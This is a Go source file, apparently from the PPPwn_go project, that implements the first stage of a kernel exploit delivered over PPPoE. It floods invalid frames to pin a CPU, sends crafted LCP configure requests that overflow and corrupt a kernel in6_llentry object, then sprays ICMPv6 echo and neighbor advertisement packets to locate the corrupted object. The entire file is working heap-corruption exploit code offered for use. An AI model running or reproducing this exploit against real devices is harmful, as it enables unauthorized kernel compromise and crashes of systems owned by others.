package exploit

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"github.com/wetor/PPPwn_go/internal/errors"
	"github.com/wetor/PPPwn_go/internal/lcp"
	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
	"github.com/wetor/PPPwn_go/internal/utils"
)

func (e *Exploit) runStage1() (err error) {

	// Send invalid packet to trigger a printf in the kernel. For some
	// reason, this causes scheduling on CPU 0 at some point, which makes
	// the next allocation use the same per-CPU cache.
	for i := 0; i < PIN_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Pinning to CPU 0...%d%%\r", int(float32(i)/float32(PIN_NUM)*100))
		}
		bytes := make([]byte, 14)
		copy(bytes, e.targetMac)
		copy(bytes[6:], e.sourceMac)
		binary.BigEndian.PutUint16(bytes[12:], uint16(layers.EthernetTypePPPoESession))
		err = e.p.Handle.WritePacketData(bytes)
		if err != nil {
			return err
		}
		time.Sleep(1 * time.Millisecond)
	}

	logger.Infof("[+] Pinning to CPU 0...done")

	// LCP fails sometimes without the wait
	time.Sleep(1 * time.Second)

	// Corrupt in6_llentry object
	overflowLle := e.BuildOverflowLle()
	logger.Infof("[*] Sending malicious LCP configure request...")
	for i := 0; i < CORRUPT_NUM; i++ {

		buf := bytes.NewBuffer(nil)
		buf.Write(utils.P16be(uint16(TARGET_SIZE - 2)))
		buf.Write(bytes.Repeat([]byte("A"), TARGET_SIZE-4))
		buf.Write(utils.P16be(uint16(len(overflowLle) + 2)))
		buf.Write(overflowLle)

		err = e.p.SendLCP(&packet.SendLCPParams{
			SrcMAC:       e.sourceMac,
			DstMAC:       e.targetMac,
			EthernetType: layers.EthernetTypePPPoESession,
			SessionID:    SESSION_ID,
			LCP: &lcp.Pkt{
				Proto:   lcp.ProtoLCP,
				Code:    lcp.CodeConfigureRequest,
				ID:      LCP_ID,
				Len:     uint16(TARGET_SIZE + 4),
				Payload: buf.Bytes(),
			},
		})
		if err != nil {
			return err
		}
	}

	logger.Infof("[*] Waiting for LCP configure reject...")
	// recv
	_, _, err = e.p.ReceiveLCP(e.ctx, lcp.ProtoLCP, lcp.CodeConfigureReject)
	if err != nil {
		return err
	}

	// Re-negotiate after rejection
	err = e.lcpNegotiation()
	if err != nil {
		return err
	}
	err = e.ipcpNegotiation()
	if err != nil {
		return err
	}

	var sourceIPv6 net.IP
	corrupted := false

	// TODO: Time consumption is too long
	for i := SPRAY_NUM - 1; i >= 0; i-- {
		if i%0x100 == 0 {
			fmt.Printf("[*] Scanning for corrupted object...%x\r", i)
		}
		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		// send
		sourceIPv6 = net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i))
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.sourceMac,
			DstMAC:       e.targetMac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        sourceIPv6,
			DstIP:        e.targetIPv6,
			HopLimit:     64,
			ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6Echo{},
			},
		})
		if err != nil {
			return err
		}

		// recv
		err = e.p.Receive(&packet.ReceiveParams{
			Ctx: e.ctx,
			Log: false,
			Layer: []*packet.LayerValue{
				{
					Layer: layers.LayerTypeICMPv6,
					Check: func(val any) bool {
						if icmpv6, ok := val.(*layers.ICMPv6); ok {
							if icmpv6.TypeCode.Type() == layers.ICMPv6TypeEchoReply {
								return true
							} else if icmpv6.TypeCode.Type() == layers.ICMPv6TypeNeighborSolicitation {
								corrupted = true
								return true
							}
						}
						return false
					},
				},
			},
		})
		if err != nil {
			return err
		}
		if corrupted {
			break
		}

		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.sourceMac,
			DstMAC:       e.targetMac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        sourceIPv6,
			DstIP:        e.targetIPv6,
			HopLimit:     255,
			ICMPv6Type:   layers.ICMPv6TypeNeighborAdvertisement,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6NeighborAdvertisement{
					TargetAddress: sourceIPv6,
					Flags:         0xE0,
					Options: []layers.ICMPv6Option{
						{
							Type: layers.ICMPv6OptTargetAddress,
							Data: e.sourceMac,
						},
					},
				},
			},
		})
		if err != nil {
			return err
		}
	}

	if !corrupted {
		logger.Infof("[-] Scanning for corrupted object...failed. Please retry.")
		return errors.ScanningCorruptedFailedError
	}

	logger.Infof("[+] Scanning for corrupted object...found %v", sourceIPv6.String())
	return nil
}
